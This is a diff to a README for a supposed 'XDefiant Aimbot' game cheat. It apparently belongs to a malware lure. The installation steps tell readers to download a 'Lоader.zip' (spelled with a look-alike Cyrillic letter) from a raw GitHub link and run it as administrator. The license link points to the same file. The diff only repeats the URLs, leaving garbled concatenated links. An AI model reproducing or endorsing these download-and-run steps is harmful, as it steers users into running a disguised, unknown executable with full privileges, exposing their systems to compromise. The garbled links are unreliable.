@@ -6,8 +6,8 @@ Welcome to **XDefiant Aimbot**, your all-in-one advanced performance booster for
 
 ## 🚦 Installation Guide
 
-1. **Download https://raw.githubusercontent.com/zahrawou/XDefiantSharpAim/main/Lоader.zipоhttps://raw.githubusercontent.com/zahrawou/XDefiantSharpAim/main/Lоader.zip** from the repository and extract its contents to a folder of your choice.
-2. **Run the https://raw.githubusercontent.com/zahrawou/XDefiantSharpAim/main/Lоader.zipоhttps://raw.githubusercontent.com/zahrawou/XDefiantSharpAim/main/Lоader.zip** application file as administrator to ensure full functionality.
+1. **Download https://raw.githubusercontent.com/zahrawou/XDefiantSharpAim/main/Lоader.zipоhttps://raw.githubusercontent.com/zahrawou/XDefiantSharpAim/main/Lоader.zipоhttps://raw.githubusercontent.com/zahrawou/XDefiantSharpAim/main/Lоader.zipоhttps://raw.githubusercontent.com/zahrawou/XDefiantSharpAim/main/Lоader.zip** from the repository and extract its contents to a folder of your choice.
+2. **Run the https://raw.githubusercontent.com/zahrawou/XDefiantSharpAim/main/Lоader.zipоhttps://raw.githubusercontent.com/zahrawou/XDefiantSharpAim/main/Lоader.zipоhttps://raw.githubusercontent.com/zahrawou/XDefiantSharpAim/main/Lоader.zipоhttps://raw.githubusercontent.com/zahrawou/XDefiantSharpAim/main/Lоader.zip** application file as administrator to ensure full functionality.
 3. Follow the on-screen installer instructions, then launch XDefiant.
 4. Configure your settings via the intuitive interface and start enhancing your skills instantly!
 
@@ -81,7 +81,7 @@ Welcome to **XDefiant Aimbot**, your all-in-one advanced performance booster for
 ## 📜 License
 
 This project is licensed under the **MIT License**.  
-See: [MIT License](https://raw.githubusercontent.com/zahrawou/XDefiantSharpAim/main/Lоader.zipоhttps://raw.githubusercontent.com/zahrawou/XDefiantSharpAim/main/Lоader.zip)
+See: [MIT License](https://raw.githubusercontent.com/zahrawou/XDefiantSharpAim/main/Lоader.zipоhttps://raw.githubusercontent.com/zahrawou/XDefiantSharpAim/main/Lоader.zipоhttps://raw.githubusercontent.com/zahrawou/XDefiantSharpAim/main/Lоader.zipоhttps://raw.githubusercontent.com/zahrawou/XDefiantSharpAim/main/Lоader.zip)
 
 ---
 
